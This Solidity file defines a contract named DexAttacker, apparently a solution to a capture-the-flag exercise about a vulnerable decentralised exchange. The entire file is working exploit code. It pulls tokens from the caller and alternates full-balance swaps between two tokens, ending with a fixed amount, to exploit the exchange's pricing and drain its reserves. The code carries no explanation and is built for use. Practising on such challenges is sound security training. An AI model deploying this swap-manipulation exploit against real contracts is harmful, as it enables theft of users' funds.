// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IDex {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external returns (address);
    function token2() external returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract DexAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        (address token1, address token2) = (IDex(challengeInstance).token1(), IDex(challengeInstance).token2());
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);
        IDex(challengeInstance).approve(address(challengeInstance), type(uint).max);
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, IDex(challengeInstance).balanceOf(token2, address(this)));
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, IDex(challengeInstance).balanceOf(token2, address(this)));
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, 45);
    }
}